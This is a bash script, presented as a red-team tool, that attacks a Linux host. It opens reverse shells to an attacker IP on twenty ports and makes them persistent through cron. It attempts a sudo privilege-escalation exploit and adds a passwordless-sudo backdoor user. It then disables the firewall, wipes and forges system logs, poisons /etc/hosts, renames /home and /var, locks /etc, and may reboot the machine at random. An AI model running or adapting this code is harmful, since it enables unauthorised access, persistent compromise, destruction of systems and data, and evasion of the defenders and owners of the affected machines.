#!/bin/bash

# Red Team - Multi-Port Infiltration and Privilege Escalation with Annoyance Features
# This script sets up multiple reverse shells on 20+ ports, escalates privileges, floods with cron jobs, 
# adds backdoors, messes with directories, logs, and services

ATTACKER_IP="192.168.1.100"
TARGET_USER="targetuser"
BACKDOOR_USER="backdoor"
BACKDOOR_PASS="backdoorpass"
PORTS=(4441 4442 4443 4444 4445 4446 4447 4448 4449 4450 4451 4452 4453 4454 4455 4456 4457 4458 4459 4460)

LOG_FILE="/tmp/redteam_multiport.log"
CRON_LOG="/tmp/cron_flood.log"

echo "[+] Multi-Port Infiltration Attack Started at $(date)" >> $LOG_FILE

# Step 1: Privilege Escalation Attempts on each port
echo "[+] Attempting privilege escalation via multi-port reverse shells..." >> $LOG_FILE

for port in "${PORTS[@]}"; do
    REVERSE_SHELL_CMD="bash -i >& /dev/tcp/$ATTACKER_IP/$port 0>&1"
    
    # Attempt to escalate privileges using reverse shell
    nohup bash -c "$REVERSE_SHELL_CMD" &>/dev/null &
    
    # Add a cron job for each port to persist the reverse shell
    (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$port 0>&1") | crontab -
    echo "[+] Reverse shell and cron job created on port $port" >> $LOG_FILE
done

# Step 2: Privilege Escalation using CVE-2021-3156 (Baron Samedit)
echo "[+] Attempting privilege escalation using CVE-2021-3156..." >> $LOG_FILE
sudoedit -s '\' $(perl -e 'print "A" x 65536') 2>/dev/null || true

# Check if root privileges were acquired
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Privilege escalation successful! Running as root." >> $LOG_FILE
else
    echo "[!] Privilege escalation failed. Continuing with standard user privileges." >> $LOG_FILE
fi

# Step 3: Set up persistent backdoor users and reset passwords
echo "[+] Adding backdoor user and resetting target user's password..." >> $LOG_FILE

# Add a backdoor user with sudo privileges
useradd -m -p $(openssl passwd -1 $BACKDOOR_PASS) -s /bin/bash $BACKDOOR_USER
usermod -aG sudo $BACKDOOR_USER
echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Reset password of the target user every minute using cron
(crontab -l 2>/dev/null; echo "*/1 * * * * echo '$TARGET_USER:changedpassword' | chpasswd") | crontab -
echo "[+] Target user's password will be reset every minute." >> $LOG_FILE

# Step 4: Create multiple fake cron jobs for system disruption
echo "[+] Creating disruptive cron jobs..." >> $LOG_FILE

# Create cron jobs for system flooding and resource exhaustion
add_cron_job() {
    JOB_CMD=$1
    INTERVAL=$2
    (crontab -l 2>/dev/null; echo "$INTERVAL $JOB_CMD") | crontab -
    echo "[+] Cron job added: $JOB_CMD at interval $INTERVAL" >> $CRON_LOG
}

# Create fake files in /tmp every minute
add_cron_job "dd if=/dev/urandom of=/tmp/junk_\$(date +\%s).bin bs=1M count=5" "*/1 * * * *"

# Spam logs with fake critical errors every 2 minutes
add_cron_job "echo 'CRITICAL ERROR: System malfunction at $(date)' >> /var/log/syslog" "*/2 * * * *"

# Modify /etc/hosts every 5 minutes to confuse network operations
add_cron_job "echo '127.0.0.1 google.com' >> /etc/hosts" "*/5 * * * *"

# Restart random services every 7 minutes
add_cron_job "systemctl restart ssh" "*/7 * * * *"
add_cron_job "systemctl restart apache2" "*/7 * * * *"
add_cron_job "ufw disable" "*/10 * * * *"

# Step 5: Create a flood of random folders and files
echo "[+] Creating random folders and files in /tmp to confuse defenders..." >> $LOG_FILE

for i in {1..200}; do
    RAND_DIR="/tmp/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
    mkdir -p $RAND_DIR
    touch $RAND_DIR/file_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    echo "Random data: $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 100)" >> $RAND_DIR/log.txt
done

# Step 6: Log manipulation and hiding traces
echo "[+] Manipulating logs and hiding traces..." >> $LOG_FILE

# Wipe all critical system logs to hide traces
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/kern.log
echo > /var/log/messages

# Insert fake log entries
echo "Oct  5 16:22:31 localhost systemd[1]: Started Session 4 of user root." >> /var/log/syslog
echo "Oct  5 16:22:32 localhost sshd[2543]: Accepted password for root from 192.168.1.200 port 51123 ssh2" >> /var/log/auth.log

# Step 7: Mess with directories and services
echo "[+] Messing with directories and services..." >> $LOG_FILE

# Rename critical system directories to confuse defenders
mv /home /home_confusion
mv /var /var_confusion
chmod 000 /etc  # Hide /etc directory

# Disable important services
systemctl disable ssh
systemctl disable apache2

# Step 8: Random system reboot to add chaos
echo "[+] Rebooting system randomly..." >> $LOG_FILE
if (( RANDOM % 2 )); then
    reboot
fi

# Final message in logs
echo "[+] Multi-Port Infiltration and Privilege Escalation Complete at $(date)" >> $LOG_FILE